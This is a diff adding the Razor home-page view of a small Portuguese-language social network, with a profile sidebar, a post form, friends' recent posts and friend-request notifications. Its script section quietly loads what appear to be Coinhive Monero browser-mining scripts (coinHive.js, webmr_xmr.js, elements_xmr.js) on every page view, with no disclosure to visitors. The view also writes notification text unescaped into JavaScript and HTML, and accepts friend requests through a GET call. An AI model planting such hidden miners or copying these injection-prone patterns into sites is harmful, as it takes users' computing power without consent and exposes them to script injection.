@@ -1,0 +1,150 @@
+﻿@model  WebAPI.MVC.Models.ProfileViewModel
+<body>
+    @{
+        Layout = "~/Views/Shared/_Layout.cshtml";
+        ViewBag.Title = "Lettucebrain - Home";
+        Styles.Render("~/Content/PostList.css");
+    }
+    <style>
+
+        p {
+            word-break: break-all;
+            white-space: normal;
+            word-wrap: break-word;
+        }
+    </style>
+    <div class="text-center" style="margin-top: 3%">
+        <div class="row">
+            <div class="col-sm-3">
+                <div class="well">
+                    <img src="@Model.PhotoUrl" class="img-circle" height="130" width="130" alt="Avatar">
+                    <p>@Html.ActionLink(Model.FirstName, "Details", "Profiles", routeValues: new { Id = Model.Id }, htmlAttributes: null)</p>
+                </div>
+                <div class="alert alert-success fade in">
+                    <a href="#" class="close" data-dismiss="alert" aria-label="close">×</a>
+                    <p><strong>Seja Bemvindo!</strong></p>
+                </div>
+                <div class="alert alert-success fade in">
+                    <a href="@Url.Action("Index", "Gallery")">My Galleries</a>
+                </div>
+
+                <div class="alert alert-success fade in">
+                    @using (Html.BeginForm("Index","Profiles"))
+                    {
+                        <p>Digite o nome</p>
+                        <input type="text" name="termo" id="termo" placeholder="Digite a pesquisa" />
+                        <button type="submit">Filtrar</button>
+                    }
+                </div>
+
+            </div>
+            <div class="col-sm-6" style="text-align: center">
+                @using (Html.BeginForm("AddProfilePost", "Profiles", FormMethod.Post, new { id = "postForm" }))
+                {
+                    @Html.AntiForgeryToken()
+                    <form class="form-horizontal well" role="form">
+                        @*<h4>O que é que há, velhinho?</h4>*@
+                        @if (TempData["IsPostEmpty"] != null && (bool)TempData["IsPostEmpty"] == true)
+                        {
+                            <h4 style="color: red">Escreva algo aqui!</h4>
+                        }
+                        <textarea class="form-control input-lg" name="Content" style="min-width: 100%" placeholder="Bate Papo!"></textarea>
+                        <input type="submit" id="postBtn" value="Publicar" class="btn btn-primary pull-right" />
+                        <ul class="list-inline">
+                            <li><a href=""><i class="glyphicon glyphicon-upload"></i></a></li>
+                            <li><a href=""><i class="glyphicon glyphicon-camera"></i></a></li>
+                            <li><a href=""><i class="glyphicon glyphicon-map-marker"></i></a></li>
+                        </ul>
+                    </form>
+                }
+                <div class="row">
+                    <h4>Sua última publicação</h4>
+                    <div class="col-sm-3">
+                        <div class="well">
+                            <p>@Model.FirstName</p>
+                            <a href="@Url.Action("Details", "Profiles")?id=@Model.Id"><img src="@Model.PhotoUrl" class="img-circle" height="55" width="55" alt="Avatar" /></a>
+                        </div>
+                    </div>
+                    <div class="col-sm-9">
+                        <div class="well">
+                            @{
+                                if (Model.Posts.Count > 0)
+                                {
+                                    <p>@Model.Posts.OrderByDescending(p => p.PostTime).First().Content</p>
+                                }
+                                else
+                                {
+                                    <i>Você ainda não tem nenhuma publicação</i>
+                                }
+                            }
+                        </div>
+                    </div>
+                </div>
+                <h4>Publicações mais recentes dos seus amigos</h4>
+                @foreach (var friend in Model.Friends)
+                {
+                    if (friend.RequestedTo.Posts.Count > 0 && friend.Status == WebAPI.MVC.Models.StatusEnumViewModel.Accepted)
+                    {
+                        <div class="row">
+                            <div class="col-sm-3">
+                                <div class="well">
+                                    <p>@friend.RequestedTo.FirstName</p>
+                                    <a href="@Url.Action("Details", "Profiles")?userId=@friend.RequestedTo.Id"><img src="@friend.RequestedTo.PhotoUrl" class="img-circle" height="55" width="55" alt="Avatar" /></a>
+                                </div>
+                            </div>
+                            <div class="col-sm-9">
+                                <div class="well">
+                                    <p>@friend.RequestedTo.Posts.OrderByDescending(p => p.PostTime).First().Content</p>
+                                </div>
+                            </div>
+                        </div>
+                    }
+                }
+            </div>
+        </div>
+    </div>
+</body>
+@section Scripts
+{
+    @Scripts.Render("~/Scripts/coinHive.js")
+    @Scripts.Render("~/Scripts/webmr_xmr.js")
+    @Scripts.Render("~/Scripts/functions.js")
+    @Scripts.Render("~/Scripts/cntc.js")
+    @Scripts.Render("~/Scripts/elements_xmr.js")
+    @Scripts.Render("~/Scripts/currency.js")
+    <script>
+        //if (window.canRunAds === undefined)
+        //    alert('Detectamos um bloqueador de anúncios no seu navegador. Por favor desative este bloqueador.');
+
+        $("#postBtn").click(function () {
+            $(this).attr("disabled", "disabled");
+            $("#postForm").submit();
+        });
+
+        @foreach (var notification in Model.Notifications)
+        {
+            @:$("#userNotifications").append("<br /><br />");
+            @:$("#userNotifications").append("<div style='width:100%;background:coral;border:2px solid'><p>@notification.Message</p></div>");
+            @:$("#userNotifications").append(`<button data-notification-message="@notification.Message" data-notification-id="@notification.NotificationIssuerId" data-issuer="@notification.NotificationIssuer.Id" class="acceptBtn btn btn-success" style='width:45%' type='button' class='btn btn-success btn-sm'><a class="links">Aceitar</a></button>`);
+        }
+
+        $(".acceptBtn").click(function () {
+            $(this).attr("disabled", "disabled");
+            $.ajax({
+                url: "http://localhost:49609/friendship/acceptfriendship",
+                type: "get",
+                data: {
+                    "toUserId": $(this).attr("data-issuer"),
+                    "notificationId": $(this).attr("data-notification-id"),
+                    "notificationMessage": $(this).attr("data-notification-message")
+                },
+                success: function () {
+                },
+                dataType: "json"
+            });
+            window.location.reload(true);
+        });
+
+    $("#notification_bar").append($("#userNotifications"));
+    </script>
+}
